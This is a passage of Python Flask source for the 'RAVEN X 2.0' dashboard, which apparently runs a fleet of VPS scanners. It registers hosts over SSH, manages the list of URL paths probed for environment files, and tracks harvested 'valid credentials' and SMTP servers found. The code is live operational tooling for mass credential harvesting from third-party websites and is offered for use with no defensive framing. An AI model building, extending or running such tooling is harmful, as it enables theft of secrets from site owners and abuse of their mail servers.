                # key auth — accept either a path or fall back to controller default
                key_path = r['secret']
                if not key_path:
                    # fall back to the controller's fleet key
                    default = os.path.join(os.path.dirname(SCANNER_CONFIG_PATH), '..', '.ssh', 'id_ed25519')
                    if os.path.exists(default):
                        kwargs['key_filename'] = default
                else:
                    kwargs['key_filename'] = key_path
            cli.connect(**kwargs)
            cli.close()
            result['ok'] = True
            result['message'] = 'connected'
            accepted_ips.append(r['host'])
        except Exception as e:
            result['message'] = str(e)
        results.append(result)

    # Append OK rows to server_ips.txt (idempotent — dedup against existing)
    server_ips = os.path.join('.', 'server_ips.txt')
    try:
        existing = set()
        if os.path.exists(server_ips):
            with open(server_ips, 'r') as f:
                existing = {ln.strip() for ln in f if ln.strip()}
        new_ips = [ip for ip in accepted_ips if ip not in existing]
        if new_ips:
            with open(server_ips, 'a') as f:
                for ip in new_ips:
                    f.write(ip + '\n')
    except Exception:
        pass

    return jsonify({
        'total': len(rows),
        'ok': sum(1 for r in results if r['ok']),
        'failed': sum(1 for r in results if not r['ok']),
        'results': results,
        'added_to_roster': len(accepted_ips),
    })


# ==================== SCANNER PATH FILE ====================

SCANNER_PATHS_FILE = 'paths.txt'


@app.route('/api/scanner-paths', methods=['GET', 'POST', 'DELETE'])
def api_scanner_paths():
    """Read, replace, or clear paths.txt — the override list consumed by main.go's loadEnvPaths().
    When paths.txt is absent main.go falls back to its built-in ~70 default paths."""
    if request.method == 'GET':
        if not os.path.exists(SCANNER_PATHS_FILE):
            return jsonify({'present': False, 'lines': 0, 'source': 'builtin'})
        with open(SCANNER_PATHS_FILE, 'r') as f:
            lines = [ln.rstrip('\n') for ln in f if ln.strip() and not ln.lstrip().startswith('#')]
        return jsonify({'present': True, 'lines': len(lines), 'source': 'paths.txt'})

    if request.method == 'DELETE':
        if os.path.exists(SCANNER_PATHS_FILE):
            os.remove(SCANNER_PATHS_FILE)
        return jsonify({'present': False, 'lines': 0, 'source': 'builtin'})

    # POST: multipart file upload OR raw text body.
    if 'file' in request.files:
        body = request.files['file'].read().decode('utf-8', errors='ignore')
    else:
        body = request.get_data(as_text=True) or ''

    lines = []
    for ln in body.splitlines():
        s = ln.strip()
        if not s or s.startswith('#'):
            continue
        if not s.startswith('/'):
            s = '/' + s
        lines.append(s)
    if not lines:
        return jsonify({'error': 'No valid path lines (each must be a URL path).'}), 400

    with open(SCANNER_PATHS_FILE, 'w') as f:
        for ln in lines:
            f.write(ln + '\n')
    return jsonify({'present': True, 'lines': len(lines), 'source': 'paths.txt'})


@app.route('/api/update', methods=['GET', 'POST'])
def api_update():
    """Trigger a self-update: git pull + re-run installer via the sudoers-allowlisted helper.
    The dashboard banner posts here; the helper runs detached so the request returns immediately."""
    import shutil
    helper = '/usr/local/bin/reconx-update'

    if request.method == 'GET':
        return jsonify({'available': os.path.exists(helper), 'helper': helper})

    if not os.path.exists(helper):
        return jsonify({
            'started': False,
            'error': 'Update helper not installed. Re-run installer/deploy.py on the controller.',
        }), 503

    sudo = shutil.which('sudo') or '/usr/bin/sudo'
    try:
        subprocess.Popen(
            [sudo, '-n', helper],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception as e:
        return jsonify({'started': False, 'error': str(e)}), 500

    return jsonify({
        'started': True,
        'message': 'Update started. Services will restart in 30–90s.',
    })


# ==================== WEBSOCKET HANDLERS ====================

@socketio.on('connect')
def handle_connect():
    print('🔌 Client connected')
    emit('stats_update', get_statistics())

@socketio.on('disconnect')
def handle_disconnect():
    print('🔌 Client disconnected')

@socketio.on('request_update')
def handle_request_update():
    import_from_files()
    emit('stats_update', get_statistics())

@socketio.on('clear_results')
def handle_clear_results():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials')
        cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
        conn.commit()
        conn.close()
        
        if os.path.exists(RESULTS_DIR):
            for filename in os.listdir(RESULTS_DIR):
                filepath = os.path.join(RESULTS_DIR, filename)
                if os.path.isfile(filepath):
                    try:
                        os.remove(filepath)
                    except:
                        pass
        
        global file_mtimes, scan_start_time
        file_mtimes.clear()
        scan_start_time = time.time()
        
        socketio.emit('stats_update', get_statistics())
        emit('clear_complete', {'success': True})
    except Exception as e:
        emit('clear_complete', {'success': False, 'message': str(e)})

# VPS WebSocket handlers
@socketio.on('vps_request_status')
def handle_vps_request_status():
    """Request VPS status update"""
    manager = get_ssh_manager()
    if manager:
        servers = manager.get_all_status()
        stats = manager.get_global_stats()
        emit('vps_update', {'type': 'status_update', 'servers': servers, 'stats': stats})

@socketio.on('vps_start_monitoring')
def handle_vps_start_monitoring():
    """Start VPS monitoring"""
    manager = get_ssh_manager()
    if manager:
        manager.start_monitoring(vps_status_callback, interval=5)
        emit('vps_monitoring_started', {'success': True})

@socketio.on('vps_stop_monitoring')
def handle_vps_stop_monitoring():
    """Stop VPS monitoring"""
    manager = get_ssh_manager()
    if manager:
        manager.stop_monitoring()
        emit('vps_monitoring_stopped', {'success': True})

# ==================== STARTUP ====================
# Run at module-load time so gunicorn workers (which import app:app, never hit __main__) initialize the DB.
init_db()

# ==================== MAIN ====================

if __name__ == '__main__':
    print("=" * 70)
    print("🚀 RAVEN X 2.0 - UNIFIED DASHBOARD")
    print("=" * 70)
    print(f"📊 Dashboard: http://0.0.0.0:5000")
    print(f"🖥️  VPS Panel: http://0.0.0.0:5000/vps")
    print(f"🗄️  Database: {DB_PATH}")
    print(f"📁 Local Results: {RESULTS_DIR}")
    print(f"🔐 SSH Available: {SSH_AVAILABLE}")
    print("=" * 70)
    
    print(f"📥 Importing existing results...")
    imported_valid, imported_hits = import_from_files()
    print(f"✅ Imported {imported_valid} valid credentials")
    
    # Start local file monitor
    monitor_thread = threading.Thread(target=background_file_monitor, daemon=True)
    monitor_thread.start()
    print("👀 Local file monitor started")
    
    print("=" * 70)
    print("✨ Dashboard ready!")
    print("=" * 70)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
